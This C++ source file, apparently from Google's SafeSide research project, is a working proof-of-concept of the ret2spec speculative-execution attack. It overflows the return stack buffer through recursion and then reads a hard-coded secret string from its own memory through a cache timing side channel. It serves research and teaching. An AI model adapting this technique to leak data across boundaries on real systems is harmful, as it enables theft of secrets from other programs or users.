/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function.
 * We have two functions that we named after their constant return values. First
 * the returns_true function invokes itself kRecursionDepth times and in the
 * deepest invocation it calls returns_false function. Returns_false function
 * invokes itself kRecursionDepth times. All returns of the returns_false
 * function are predicted correctly, but returns of returns_true function are
 * mispredicted to the return address of the returns_false function, because all
 * RSB pointers were rewritten by returns_false invocations. We steer those
 * mispredictions to an unreachable code path with microarchitectural side
 * effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"

const char *private_data = "It's a s3kr3t!!!";

// Recursion depth should be equal or greater than the RSB size, but not
// excessively high because of the possibility of stack overflow.
constexpr size_t kRecursionDepth = 64;
constexpr size_t kCacheLineSize = 16;

// Global variables used to avoid passing parameters through recursive function
// calls.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

// Return value of returns_false that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in returns_true. Used for flushing the return address
// from the cache.
std::vector<char *> stack_mark_pointers;

// Always returns false.
static bool returns_false(int counter) {
  if (counter > 0) {
    if (returns_false(counter - 1)) {
      // Unreachable code. returns_false can never return true.
      const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
      ForceRead(isolated_oracle.data() +
                static_cast<unsigned char>(private_data[current_offset]));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  }
  return false_value;
}

// Always returns true.
static bool returns_true(int counter) {
  // Creates a stack mark and stores it to the global vector.
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    // Recursively invokes itself.
    returns_true(counter - 1);
  } else {
    // In the deepest invocation starts the returns_false recursion.
    returns_false(kRecursionDepth);
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();
  for (int i = 0; i < (stack_mark_pointers.back() - &stack_mark);
       i += kCacheLineSize) {
    CLFlush(&stack_mark + i);
  }
  return true;
}

static char leak_byte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of returns_true. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    returns_true(kRecursionDepth);
    stack_mark_pointers.pop_back();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i;
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
